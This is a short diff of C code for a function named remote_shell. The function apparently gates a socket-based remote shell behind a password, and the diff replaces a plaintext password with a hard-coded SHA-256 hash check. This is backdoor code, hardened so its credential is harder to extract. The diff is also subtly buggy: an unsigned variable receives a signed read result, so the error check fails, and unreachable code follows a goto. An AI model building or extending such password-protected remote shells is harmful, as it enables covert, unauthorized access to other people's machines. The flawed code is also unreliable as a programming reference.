@@ -1,14 +1,16 @@
+#include "digest.h"
 #include "mem.h"
 #include <errno.h>
 #include <fcntl.h>
 #include <netinet/in.h>
 #include <stddef.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
 
-#define PWD "password"
+#define PWD_SHA256 "1a7869273f5e2f8f572872a13cc6b2901762a24440b6b6a5715d894cd0135c61"
 
 ssize_t
 read_line(const int client_fd, char *const buf, size_t max_len) {
@@ -61,14 +63,20 @@ remote_shell(char **env) {
         return 1;
     }
 
+    char pwd_sha[65] = {0};
     while (1) {
-        char buf[sizeof(PWD) + 1] = {0};
-        if (read_line(client_fd, buf, sizeof(buf)) <= 0) {
+        char buf[sizeof(PWD_SHA256) + 1] = {0};
+        size_t read_bytes;
+        if ((read_bytes = read_line(client_fd, buf, sizeof(buf))) <= 0) {
             goto client_error;
             return 1;
         }
 
-        if (!ft_memcmp(PWD, buf, sizeof(PWD))) {
+        Sha256StreamingContext ctx = {0};
+        sha256_stream_init(&ctx);
+        sha256_stream_update(&ctx, (uint8_t *)buf, read_bytes);
+        sha256_stream_final(&ctx, pwd_sha);
+        if (ft_memcmp(PWD_SHA256, pwd_sha, sizeof(PWD_SHA256)) == 0) {
             break;
         }
 
